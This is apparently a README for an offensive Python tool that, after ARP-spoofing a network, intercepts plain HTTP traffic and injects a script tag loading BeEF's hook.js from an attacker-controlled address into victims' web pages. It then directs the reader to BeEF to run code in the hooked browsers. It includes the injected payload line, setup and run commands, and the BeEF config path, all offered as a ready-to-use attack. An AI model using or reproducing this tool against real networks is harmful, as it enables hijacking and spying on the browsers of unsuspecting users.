# Web hooking
After establishing MITM connection (e.g. using ARP spoofing), looking at all the HTTP requests, the program removes HTTP <code>Accept-Encoding</code> header so the response HTML load will not be encrypted. The program inserts the javascript code, <code><script src="http://10.0.2.15:3000/hook.js"></script></code>, in the HTML load of the HTTP response as a script. The addition of the lines of code are performed by replacing <code></body></code>. The specified IP address is the one of the machine that runs the program or some remote machine whom you have control. Then the program modifies the <code>Content-Length</code> value w.r.t. performed HTML changes. After this phase, you can use BeEf, to insert code or manage actions on remote victim browser. BeEF is a framework that works using javascript code so it can work on every possible browser that supports javascript language (all browsers nowadays).<br>
To use this Interceptor, you need to install the following modules for python3, through this command:
<pre lang="bash"><code>apt install beef-xss build-essential python3 libnetfilter-queue-dev</code></pre>
<pre lang="bash"><code>pip3 install termcolor argparse</code></pre>
To run the program, you need to type for example this command on bash:
<pre lang="bash"><code>python3 hook_method.py</code></pre>
To check which parameters you can insert, you can type the command:
<pre lang="bash"><code>python3 code_interceptor.py --help </code></pre>
The program must run with superuser privileges and can work only on HTTP web pages.
For management of BeEF credentials, you can manage the file:
<pre lang="bash"><code>/usr/share/beef-xss/config.yaml</code></pre>
